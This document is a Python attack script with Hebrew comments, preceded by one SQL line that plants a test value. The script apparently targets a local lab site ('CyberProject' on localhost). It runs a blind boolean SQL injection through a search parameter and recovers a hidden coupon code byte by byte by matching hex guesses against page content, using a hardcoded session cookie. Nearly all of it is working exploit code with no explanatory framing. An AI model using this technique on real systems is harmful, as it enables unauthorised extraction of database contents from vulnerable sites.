-- עדכון הקופון כך שיתחיל בבייט אפס (Null Byte)
UPDATE internal_coupons 
SET encrypted_code = X'00' || 'SECRET50' 
WHERE id = 1;

import requests

# --- נתונים מהאתר ---
BASE_URL = "http://localhost/CyberProject/products.php"
COOKIES = {'PHPSESSID': 'rv82jh01b0c0pq4ift362fg6vp'}

# תווים הקסדצימליים לבדיקת בייטים (00 עד FF)
HEX_CHARS = "0123456789ABCDEF"

def check_condition(payload):
    # שימוש בפרמטר q שבו מצאנו את הפרצה
    params = {'q': f"%' AND ({payload}) --"}
    try:
        response = requests.get(BASE_URL, params=params, cookies=COOKIES)
        # אם התנאי אמת, המוצרים (product-card) יופיעו בדף
        return "product-card" in response.text
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def leak_coupon():
    hex_result = ""
    decoded_string = ""
    print("[*] Starting Blind SQLi - Binary Extraction Mode...")
    print("[*] Target Table: internal_coupons | Column: encrypted_code")
    
    pos = 1
    while True:
        found_byte = False
        # ניחוש בייט אחד (מיוצג ע"י 2 תווי HEX)
        for c1 in HEX_CHARS:
            for c2 in HEX_CHARS:
                guess_hex = c1 + c2
                
                # השאילתה בודקת את הערך ההקסדצימלי של הבייט במיקום pos
                sub_query = f"SELECT HEX(SUBSTR(encrypted_code,{pos},1)) FROM internal_coupons LIMIT 1"
                payload = f"({sub_query})='{guess_hex}'"
                
                if check_condition(payload):
                    hex_result += guess_hex
                    
                    # ניסיון פענוח התו לצורך תצוגה בלבד
                    try:
                        char = bytes.fromhex(guess_hex).decode('ascii')
                        if char.isprintable():
                            decoded_string += char
                        else:
                            decoded_string += f"\\x{guess_hex}" # הצגת תווים לא קריאים כמו 00
                    except:
                        decoded_string += f"\\x{guess_hex}"
                        
                    print(f"[+] Pos {pos}: Found HEX {guess_hex} | Current: {decoded_string}")
                    found_byte = True
                    break
            if found_byte: break
        
        if not found_byte:
            # אם לא מצאנו אף בייט בטווח, כנראה הגענו לסוף המידע
            break
        pos += 1
            
    return decoded_string

# הרצת החילוץ
final_coupon = leak_coupon()
print("-" * 40)
print(f"[!] Extraction Complete!")
print(f"[!] Final Value: {final_coupon}")